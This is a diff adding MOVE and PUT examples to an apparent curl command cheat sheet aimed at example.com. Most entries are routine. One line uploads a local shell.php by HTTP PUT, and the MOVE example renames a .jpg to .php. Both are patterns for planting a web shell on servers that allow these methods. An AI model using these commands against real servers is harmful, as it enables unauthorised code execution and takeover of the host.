@@ -13,6 +13,23 @@
 
 -----
 
+#### MOVE file
+
+```curl -X MOVE --header Destination:http://example.com/something.jpg http://example.com/something.php```
+
+-----
+
+
+#### PUT file
+
+```curl -d "example data" -X PUT http://example.com/test.html```
+
+```curl -T localfile http://example.com/file```
+
+```cat shell.php | curl -d "$(>/dev/stdin)" -X PUT http://example.com/shell.php```
+
+-----
+
 
 #### POST JSON data file
 
